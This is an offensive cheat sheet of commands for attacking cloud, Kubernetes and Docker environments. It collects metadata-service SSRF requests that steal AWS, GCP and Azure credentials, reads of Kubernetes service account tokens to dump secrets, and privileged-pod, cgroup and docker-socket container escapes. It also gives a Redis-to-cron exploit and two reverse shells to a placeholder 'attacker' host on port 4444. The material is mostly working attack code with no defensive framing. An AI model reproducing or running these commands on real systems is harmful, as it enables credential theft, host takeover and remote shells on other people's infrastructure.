# Cloud / K8s / Docker — Container Escape & Exploitation
## Last Updated: Mon Jul 06 2026

## ==========================================
## AWS METADATA SSRF
## ==========================================

### IMDSv1 (no token needed)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
curl http://169.254.169.254/latest/user-data/
curl http://169.254.169.254/latest/meta-data/public-keys/

### IMDSv2 (token required)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

### AWS SSRF via SSM (if IMDS blocked)
# Check if SSM agent running
curl http://localhost:51678/ 2>/dev/null
# Instance metadata service via ECS
curl http://169.254.170.2/v2/credentials/ 2>/dev/null

## ==========================================
## GCP METADATA SSRF
## ==========================================

curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/

## ==========================================
## AZURE METADATA SSRF
## ==========================================

curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"

## ==========================================
## KUBERNETES API ABUSE
## ==========================================

### From outside cluster (if API exposed)
curl -sk https://<k8s-api>:6443/api/v1/pods
curl -sk https://<k8s-api>:6443/api/v1/secrets

### From inside a pod
# Check service account
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token to access API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets

# Check RBAC permissions
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews

### CVE-2026-0093 — Container Escape via CRI-O
### CVE-2026-1483 — K8s Critical Container Escape

### Privileged Pod Escape
# If running privileged:
fdisk -l  # check for devices
# Mount host filesystem
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host

# Or via cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

## ==========================================
## DOCKER ESCAPE
## ==========================================

### Check if docker socket mounted
ls -la /var/run/docker.sock 2>/dev/null

### Docker socket escape
docker run -v /:/host -it alpine chroot /host /bin/bash
# Or create privileged container
docker run --privileged -v /:/host -it ubuntu chroot /host /bin/bash

### Docker Registry abuse
curl http://target:5000/v2/_catalog
curl http://target:5000/v2/<image>/tags/list
curl http://target:5000/v2/<image>/manifests/latest

## ==========================================
## REDIS SSRF → RCE
## ==========================================

### Check if Redis exposed
timeout 3 bash -c 'echo "PING" | nc target 6379'

### If unprotected → RCE via cron
redis-cli -h target config set dir /var/spool/cron/crontabs/
redis-cli -h target config set dbfilename root
redis-cli -h target set x "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'\n\n"
redis-cli -h target save

### Via gopher SSRF
# gopher://target:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a

## ==========================================
## CLOUD STORAGE ABUSE
## ==========================================

### AWS S3
curl http://<bucket>.s3.amazonaws.com (list if public)
curl http://<bucket>.s3.us-east-1.amazonaws.com
curl -X PUT http://s3.amazonaws.com/<bucket>/test.txt -d "owned"

### GCP Storage
curl http://storage.googleapis.com/<bucket>/
curl http://<bucket>.storage.googleapis.com/

### Azure Blob
curl http://<account>.blob.core.windows.net/<container>
curl http://<account>.blob.core.windows.net/<container>?restype=container&comp=list

## ==========================================
## AWS LAMBDA ENV LEAK
## ==========================================

### If SSRF from Lambda:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# Check Lambda env vars via error injection
# Trigger error to see AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, etc.

### ECS Task metadata
curl http://169.254.170.2/v2/metadata
curl http://169.254.170.2/v2/credentials

